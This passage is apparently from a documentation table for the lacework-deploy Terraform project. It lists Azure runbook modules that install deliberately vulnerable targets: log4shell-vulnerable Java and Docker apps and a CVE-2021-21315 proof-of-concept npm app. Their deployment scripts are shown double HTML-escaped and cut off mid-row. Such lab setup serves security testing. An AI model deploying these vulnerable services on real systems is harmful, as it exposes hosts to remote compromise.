                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| target-vulnerable-docker-log4j-app                       | ./modules/runbook/deploy-docker-log4j-app            | runbook_deploy_docker_log4j_app                  | context.azure.runbook.vulnerable.docker.log4j_app                 | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;docker&quot;: {<br/>                        &quot;log4j_app&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_port&quot;: 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app            | <pre>locals &amp;&amp;#35;123;<br/>    image = &quot;ghcr&amp;#46;io/christophetd/log4shell&amp;#45;vulnerable&amp;#45;app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        if &amp;&amp;#35;91;&amp;&amp;#35;91; &amp;&amp;#35;96;sudo docker ps &amp;#124; grep $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125;&amp;&amp;#35;96; &amp;&amp;#35;93;&amp;&amp;#35;93;; then docker stop $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125;; fi<br/>        log &quot;$&amp;&amp;#35;40;echo &#x27;docker run &amp;#45;d &amp;#45;&amp;#45;name $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125; &amp;#45;v /tmp:/tmp &amp;#45;&amp;#45;rm &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;:8080 $&amp;&amp;#35;123;local&amp;#46;image&amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;&quot;<br/>        docker run &amp;#45;d &amp;#45;&amp;#45;name $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125; &amp;#45;v /tmp:/tmp &amp;#45;&amp;#45;rm &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;:8080 $&amp;&amp;#35;123;local&amp;#46;image&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps &amp;#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;curl&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;curl&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| target-vulnerable-log4j-app                              | ./modules/runbook/deploy-log4j-app                   | runbook_deploy_log4j_app                         | context.azure.runbook.vulnerable.log4j_app                        | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;log4j_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                   | <pre>locals &amp;&amp;#35;123;<br/>    app&amp;&amp;#35;95;dir = &quot;/vuln&amp;#45;log4j&amp;#45;app&quot;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    screen &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>    screen &amp;#45;wipe<br/>    truncate &amp;#45;s 0 /tmp/vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log<br/>    <br/>    rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    mkdir $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    cd $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/><br/>    log &quot;creating local files&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;web&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; web&amp;#46;py<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;ldap&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip  &gt; ldap&amp;#46;py<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;requirements&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; requirements&amp;#46;txt<br/><br/>    &amp;#35; install java 8u131<br/>    log &quot;checking for jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;&amp;#35;91; &amp;#33; &amp;#45;d /usr/java/jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131/ &amp;&amp;#35;93;; then<br/>        log &quot;jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131 not found &amp;#45; installing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        wget &amp;#45;c &amp;#45;&amp;#45;header &quot;Cookie: oraclelicense=accept&amp;#45;securebackup&amp;#45;cookie&quot; http://download&amp;#46;oracle&amp;#46;com/otn&amp;#45;pub/java/jdk/8u131&amp;#45;b11/d54c1d3a095b4ff2b6607d096fa80163/jdk&amp;#45;8u131&amp;#45;linux&amp;#45;x64&amp;#46;tar&amp;#46;gz<br/>        mkdir &amp;#45;p /usr/java<br/>        sudo tar &amp;#45;xvzf jdk&amp;#45;8u131&amp;#45;linux&amp;#45;x64&amp;#46;tar&amp;#46;gz &amp;#45;C /usr/java<br/>    else<br/>        log &quot;jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131 found &amp;#45; skipping install&quot;<br/>    fi<br/>    <br/><br/>    &amp;#35; update java path<br/>    log &quot;setting up java environment for build&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    export JAVA&amp;&amp;#35;95;HOME=/usr/java/jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131/<br/>    sudo update&amp;#45;alternatives &amp;#45;&amp;#45;install /usr/bin/java java $$&amp;&amp;#35;123;JAVA&amp;&amp;#35;95;HOME%&amp;&amp;#35;42;/&amp;&amp;#35;125;/bin/java 20000<br/>    sudo update&amp;#45;alternatives &amp;#45;&amp;#45;install /usr/bin/javac javac $$&amp;&amp;#35;123;JAVA&amp;&amp;#35;95;HOME%&amp;&amp;#35;42;/&amp;&amp;#35;125;/bin/javac 20000<br/>    <br/>    java &amp;#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &amp;#35; download gradle 7&amp;#46;3&amp;#46;1<br/>    log &quot;checking for gradle 7&amp;#46;3&amp;#46;1&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;&amp;#35;91; &amp;#33; &amp;#45;d /opt/gradle/gradle&amp;#45;7&amp;#46;3&amp;#46;1 &amp;&amp;#35;93;; then<br/>        log &quot;gradle not found &amp;#45; installing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        wget https://services&amp;#46;gradle&amp;#46;org/distributions/gradle&amp;#45;7&amp;#46;3&amp;#46;1&amp;#45;bin&amp;#46;zip<br/>        mkdir /opt/gradle<br/>        unzip &amp;#45;d /opt/gradle gradle&amp;#45;7&amp;#46;3&amp;#46;1&amp;#45;bin&amp;#46;zip<br/>    else<br/>        log &quot;gradle 7&amp;#46;3&amp;#46;1 found &amp;#45; skipping install&quot; <br/>    fi<br/><br/>    &amp;#35; update gradle path<br/>    log &quot;updating environment PATH to include gradle&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle&amp;#45;7&amp;#46;3&amp;#46;1/bin<br/>    gradle &amp;#45;&amp;#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &amp;#35; clone the log4shell vulnerable app<br/>    log &quot;cloning https://github&amp;#46;com/christophetd/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    git clone https://github&amp;#46;com/christophetd/log4shell&amp;#45;vulnerable&amp;#45;app<br/>    cd log4shell&amp;#45;vulnerable&amp;#45;app<br/>    log &quot;running gradle build&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    nohup gradle bootJar &amp;#45;&amp;#45;no&amp;#45;daemon &amp;<br/>    GRADLE&amp;&amp;#35;95;PID=$&amp;#33;<br/>    while kill &amp;#45;0 $GRADLE&amp;&amp;#35;95;PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete&amp;#46;&quot;<br/>    <br/>    ls &amp;#45;ltr build/libs/&amp;&amp;#35;42;&amp;#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &amp;#35; copy java jar<br/>    log &quot;Copying java jar&amp;#46;&amp;#46;&quot;<br/>    cp build/libs/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    &amp;#35; change to app root dir<br/>    cd $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/><br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep &amp;#45;f &quot;log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar&quot;; then<br/>            kill &amp;#45;9 $&amp;&amp;#35;40;pgrep &amp;#45;f &quot;log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar&quot;&amp;&amp;#35;41;<br/>        fi<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;m java &amp;#45;jar $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar &amp;#45;&amp;#45;server&amp;#46;port=$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;curl unzip git&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;curl unzip git&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    web = file&amp;&amp;#35;40;<br/>                            &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/web&amp;#46;py&quot;,<br/>                        &amp;&amp;#35;41;<br/><br/>    ldap = file&amp;&amp;#35;40;<br/>                            &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/ldap&amp;#46;py&quot;,<br/>                        &amp;&amp;#35;41;<br/>    requirements = file&amp;&amp;#35;40;<br/>                            &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/requirements&amp;#46;txt&quot;,<br/>                        &amp;&amp;#35;41;<br/>    <br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| target-vulnerable-npm-app                                | ./modules/runbook/deploy-npm-app                     | runbook_deploy_npm_app                           | context.azure.runbook.vulnerable.npm_app                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;npm_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                     | <pre>locals &amp;&amp;#35;123;<br/>    repo = &quot;https://github&amp;#46;com/ForbiddenProgrammer/CVE&amp;#45;2021&amp;#45;21315&amp;#45;PoC&quot;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    screen &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>    truncate &amp;#45;s 0 /tmp/vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log<br/>    log &quot;checking for git&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    while &amp;#33; command &amp;#45;v git; do<br/>        log &quot;git not found &amp;#45; waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $&amp;&amp;#35;40;command &amp;#45;v  git&amp;&amp;#35;41;&quot;<br/>    rm &amp;#45;rf /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;&amp; &amp;&amp;#35;92;<br/>    mkdir /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;&amp; &amp;&amp;#35;92;<br/>    cd /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;&amp; &amp;&amp;#35;92;<br/>    git clone $&amp;&amp;#35;123;local&amp;#46;repo&amp;&amp;#35;125; &amp;&amp; &amp;&amp;#35;92;<br/>    cd CVE&amp;#45;2021&amp;#45;21315&amp;#45;PoC &amp;&amp; &amp;&amp;#35;92;<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;index&amp;&amp;#35;95;js&amp;&amp;#35;95;base64&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; index&amp;#46;js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;m npm start &amp;#45;&amp;#45;prefix /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target/CVE&amp;#45;2021&amp;#45;21315&amp;#45;PoC<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app 